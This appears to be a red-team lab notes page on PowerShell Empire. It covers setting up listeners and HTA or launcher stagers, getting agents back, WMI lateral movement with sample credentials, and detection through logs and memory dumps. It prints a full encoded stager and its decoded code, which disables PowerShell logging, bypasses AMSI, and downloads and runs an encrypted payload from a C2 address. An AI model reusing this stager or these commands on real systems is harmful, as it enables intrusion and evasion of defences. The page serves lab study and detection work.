---
description: Exploring key concepts of the Powershell Empire
---

# Powershell Empire 101

## Listener

{% code title="attacker@local" %}
```csharp
// Empire commands used
?
uselistener meterpreter
info
```
{% endcode %}

![](../../.gitbook/assets/empire-listener.png)

Starting the listener:

```text
execute
```

![](../../.gitbook/assets/empire-startlistener.png)

## Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`- below shows how to set it up:

{% code title="attacker@local" %}
```csharp
//specify what stager to use
usestager windows/hta

//associate stager with the meterpreter listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```
{% endcode %}

![](../../.gitbook/assets/empire-stager%20%281%29.png)

A quick look at the stager code:

![](../../.gitbook/assets/stager-hta.gif)

### Issues

Various stagers I generated for the meterpreter listener were giving me errors like [this](https://github.com/EmpireProject/Empire/issues/896) and this:

![](../../.gitbook/assets/stager-bat.png)

and this:

![](../../.gitbook/assets/stager-vbs.png)

After looking at the traffic and a quick nmap scan, it seemed like there may be a bug in Empire's uselistener module when used with meterpreter - for some reason it will not actually start listening/open up the port:

![](../../.gitbook/assets/stager-listeners.png)

![](../../.gitbook/assets/stager-pcap.png)

To test this assumption, I created another http listener on port 80 - which worked immediately, leaving the meterpeter listener being buggy at least in my environment:

![](../../.gitbook/assets/stager-http.png)

## Agent

Agent is essentially a compromised victim system that called back to the listener and is now ready to receive commands.

Continuing testing with the `http` listener and a `multi/launcher` stager, the agent is finally returned once the `launcher.ps1` \(read: stager\) is executed on the victim system:

![](../../.gitbook/assets/stager-received.gif)

Let's try getting one more agent back from another machine via [WMI lateral movement](../lateral-movement/t1047-wmi-for-lateral-movement.md):

{% code title="attacker@local" %}
```csharp
interact <agent-name>
usemodule powershell/lateral_movement/invoke_wmi
set Agent <agent-name>
set UserName offense\administrator
set Password 123456
set ComputerName dc-mantvydas
run
```
{% endcode %}

![](../../.gitbook/assets/empire-lateral-wmi.gif)

## Beaconing

With default http listener profile set, below are the most commonly used URLs of the agent beaconing back to the listener:

![](../../.gitbook/assets/agent-beaconing.png)

The packet data in any of those beacons:

![](../../.gitbook/assets/agent-beacon-request-response.png)

## Observations

Note how executing the stager launcher.ps1 spawned another powershell instance and both parent and the child windows are hidden. Note that the children powershell was invoked with an encoded powershell command line:

![](../../.gitbook/assets/agent-procmon.png)

Stager's command line in base64:

```csharp
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBzAEUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAGEATAB1AGUAKAAkAE4AdQBsAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAYwB0AEkATwBuAHMALgBHAGUATgBlAFIAaQBDAC4ARABJAGMAdABpAG8ATgBhAFIAeQBbAHMAVABSAEkAbgBHACwAUwB5AHMAdABFAG0ALgBPAGIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUATABTAEUAewBbAFMAYwByAEkAcAB0AEIATABPAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAFUATABMACwAKABOAGUAdwAtAE8AQgBqAEUAQwB0ACAAQwBvAEwAbABFAEMAVABJAG8AbgBTAC4ARwBFAE4AZQByAEkAQwAuAEgAYQBzAEgAUwBlAFQAWwBzAHQAcgBJAE4AZwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUATQBiAGwAWQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATABVAGUAKAAkAG4AVQBMAGwALAAkAHQAcgBVAGUAKQB9ADsAfQA7AFsAUwB5AFMAdABFAG0ALgBOAGUAdAAuAFMARQBSAFYAaQBjAGUAUABPAGkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAEIASgBlAEMAVAAgAFMAeQBTAFQAZQBNAC4ATgBlAHQALgBXAGUAYgBDAEwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwBZAFMAdABFAG0ALgBOAEUAdAAuAFcARQBiAFIARQBRAFUAZQBTAFQAXQA6ADoARABFAGYAQQB1AEwAVABXAEUAYgBQAFIAbwB4AHkAOwAkAFcAQwAuAFAAUgBvAFgAWQAuAEMAcgBFAEQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBDAHIARQBkAEUATgBUAEkAQQBsAEMAYQBDAEgARQBdADoAOgBEAEUAZgBhAHUAbAB0AE4AZQBUAHcATwBSAGsAQwBSAGUAZABFAG4AVABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAEUAeABUAC4ARQBuAEMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAUgAuACUAPwBWAHQAQwA4AHgAcQBnAG4AcwBGAGMANQBaACsAOgA5AHcAZABFAH0AQQBCAE0AcAB7AG0AegBPACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADEAOgA4ADAAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AOQB1AGwAYQB0AEwASwBMAHgANQBEAFcAWgA1AEkAYQB3AFIAdQBzAEYAUwAyAFoAMgByAEEAPQAiACkAOwAkAGQAQQB0AGEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEAZABEAGEAdABBACgAJABTAEUAUgArACQAdAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAEQAYQB0AEEAWwA0AC4ALgAkAEQAYQB0AEEALgBMAGUATgBnAFQASABdADsALQBqAE8AaQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

Decoded command line with notable user agent, C2 server and a session cookie:

```csharp
If($PSVeRsiOnTabLe.PSVErSiON.MAJOR - ge 3) {
    $GPF = [ReF].AssEmBly.GeTTyPE('System.Management.Automation.Utils').
    "GETFiE`ld" ('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
    If($GPF) {
        $GPC = $GPF.GetVaLue($NulL);
        IF($GPC['ScriptB' + 'lockLogging']) {
            $GPC['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
            $GPC['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $vAL = [ColLEctIOns.GeNeRiC.DIctioNaRy[sTRInG, SystEm.ObjEct]]::nEw();
        $val.ADd('EnableScriptB' + 'lockLogging', 0);
        $VaL.ADd('EnableScriptBlockInvocationLogging', 0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $Val
    }
    ELSE {
        [ScrIptBLOCk].
        "GeTFiE`lD" ('signatures', 'N' + 'onPublic,Static').SeTVaLUe($nULL, (New - OBjECt CoLlECTIonS.GENerIC.HasHSeT[strINg]))
    }[REF].ASSEMblY.GETTYpe('System.Management.Automation.AmsiUtils') | ? {
        $_
    } | % {
        $_.GETField('amsiInitFailed', 'NonPublic,Static').SETVALUe($nULl, $trUe)
    };
};
[SyStEm.Net.SERVicePOiNtMANAGEr]::EXpeCt100CoNtINUe = 0;
$wc = NEW - OBJeCT SySTeM.Net.WebCLIENT;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wc.HeAderS.Add('User-Agent', $u);
$wc.PROXy = [SYStEm.NEt.WEbREQUeST]::DEfAuLTWEbPRoxy;
$WC.PRoXY.CrEDenTiaLS = [SYsteM.NET.CrEdENTIAlCaCHE]::DEfaultNeTwORkCRedEnTiaLs;
$Script: Proxy = $wc.Proxy;
$K = [SystEM.TExT.EnCODINg]::ASCII.GeTBytes('R.%?VtC8xqgnsFc5Z+:9wdE}ABMp{mzO');
$R = {
    $D,
    $K = $ARGS;$S = 0. .255;0. .255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.COUNt]) % 256;$S[$_],
        $S[$J] = $S[$J],
        $S[$_]
    };$D | % {
        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
        $S[$H] = $S[$H],
        $S[$I];$_ - bxor$S[($S[$I] + $S[$H]) % 256]
    }
};
$ser = 'http://192.168.2.71:80';
$t = '/login/process.php';
$Wc.HEAderS.AdD("Cookie", "session=9ulatLKLx5DWZ5IawRusFS2Z2rA=");
$dAta = $WC.DoWNloAdDatA($SER + $t);
$Iv = $DATa[0. .3];
$DaTA = $DatA[4..$DatA.LeNgTH]; - jOiN[ChaR[]]( & $R $datA($IV + $K)) | IEX
```

### Logs

If we isolate the evil powershell that was infected by the Empire in our SIEM, we can see the beacons:

![](../../.gitbook/assets/agent-beacons-logs.png)

A compromised system can generate event `800` showing the following in Windows PowerShell logs \(powershell 5.0+\):

![](../../.gitbook/assets/empire-800.png)

Also loads of `4103` events in `Microsoft-Windows-PowerShell/Operational`:

![](../../.gitbook/assets/empire-4103.png)

In the same way, if PS transcript logging is enabled, the stager execution could be captured in there:

![](../../.gitbook/assets/empire-transcript.png)

### Memory Dumps

A memory dump can also reveal the same stager activity:

```csharp
volatility -f /mnt/memdumps/w7-empire.bin consoles --profile Win7SP1x64
```

![](../../.gitbook/assets/empire-volatility.png)

## References

{% embed url="http://www.harmj0y.net/blog/empire/expanding-your-empire/" %}

{% embed url="http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/" %}

{% embed url="https://ethicalhackingblog.com/hacking-powershell-empire-2-0/" %}

{% embed url="http://www.sixdub.net/?p=627" %}

[https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315](https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315)



